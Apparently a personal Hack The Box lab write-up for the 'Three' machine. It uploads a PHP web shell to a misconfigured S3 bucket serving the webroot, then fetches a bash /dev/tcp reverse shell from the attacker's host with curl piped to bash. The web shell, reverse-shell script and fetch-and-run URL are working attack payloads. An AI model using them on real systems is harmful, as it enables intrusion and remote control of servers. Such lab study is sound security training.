## Lab Title: Three
- Date: 2025-08-02
- Duration: ~30 minutes

### Platform: HTB – Starting Point > Tier 0

### 1. Scenario Summary
- Upload files S3 Bucket, Web/Reverse Shells, Server Side Code Injection
### 2. Findings
- Nmap          >> Enumeration
    - 2 TCP ports: 22, 80
    - Apache httpd 2.4.29 ((Ubuntu))
- Website       >> on port 80: running website
    - mail@thetoppers.htb >> domain: thetoppers.htb

- `etc/hosts`   >> triggers when DNS is unavailable
    - `echo "10.129.19.12 thetoppers.htb" | sudo tee -a /etc/hosts`
    - `echo "10.129.19.12 s3.thetoppers.htb" | sudo tee -a /etc/hosts`

- S3 Bucket     >> S3 Buckets >> cloud-based storage
    - Usage: Media Hosting, Software Delivery, Static Website
    - `awscli` in Linux >> used to interact with S3 bucket
    - `aws configure` >> to configure with `temp` options
    - `aws --endpoint=http://s3.thetoppers.htb s3 ls` >> to list buckets hosted by the server
    - `aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb` >> to list objects of specific bucket

    - Idea:
        - apparently here, the webroot: is S3 bucket (mounted on this /var/www/html) location >> Apache is using this
        - we send here shell.php with `awscli` >> this file contains a PHP code >> `<?php system($_GET["cmd"]); ?>`
        - system() function executes commands in the server
        - Later we give a command from the browser to this server >> server runs these commands
    - Steps:
        1. `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
        2. `aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb`
        3. In the browser we set `whoami` command to be executed: ` http://thetoppers.htb/shell.php?cmd=whoami`
            ```code

                    Browser URL	shell.php?cmd=whoami
                    PHP sees	$_GET['cmd'] = "whoami"
                    Runs	system("whoami")
                    Server executes	whoami (Linux command)
                    Output	e.g., www-data → shown in browser
            ```

- Reverse Shell
    1. `shell.sh` file >>
        ```code
                #!/bin/bash
                bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
        ```
        - Explanation:
            ```code
                0 >> standard input
                1 >> standard output
                2 >> standard error

                1. bash -i >> launches an interactive shell
                2. >& /dev/tcp/<YOUR_IP>/1337
                    Here >& means = shorthand for:
                        1> /dev/tcp/<YOUR_IP>/1337 2>&1
                            1> → send standard output to /dev/tcp/...
                            2>&1 → send standard error to the same place as FD 1
                3. 0>&1 means:
                    0> redirect standard input
                    0>&1 >> make stdin come from the same place as stdout
            ```
    2. We will start a `ncat` listener on our local port `1337`
        - `nc -nvlp 1337` now it takes sdtn outpout/error/input capabilities from reverse shell

    3. Start a web server on our local machine on port 8000 and host this bash file:
        - `python3 -m http.server 8000`

    4. Visit the site: with `curl` we fetch the reverse shell file and pipe it to bash:
        - `http://thetoppers.htb/shell.php?cmd=curl%20%<YOUR_IP_ADDRESS>:8000/shell.sh|bash`
        ```describe
            ┌────────────┐      HTTP GET     ┌─────────────────────┐
            │  Your PC   │ ───────────────▶  │  thetoppers.htb      │
            │            │ shell.php?cmd=... │  (PHP system() runs) │
            └────────────┘                   └──────────┬───────────┘
                                          ▼
                                 Run on target server:
                         curl http://<YOU>:8000/shell.sh | bash
                                          ▼
                           Server connects back to you:
                      bash -i >& /dev/tcp/<YOU>:1337 0>&1
                                          ▼
                     You get reverse shell in your netcat
        ```
    5. Finding flag easier then >> `find / -name flag.txt 2>/dev/null`

### 3. Idea
- IP >> directed to domain >> domain has subdomain found by Gobuster(vhost) >> then since it's Amazon S3 bucket connected to it via `awscli` >> created a PHP Shell to run commands since S3 is used / mounted in Webroot, used by Apache. These commands are run on server side >> we send them by browser >> then create a reverse shell >> we force the PHP to get our shell.sh and send it server PHP treats this as internal command >> we specified to pipe to bash >> reverse shell is executed >> connected to our netcat lister on local machine. Voila
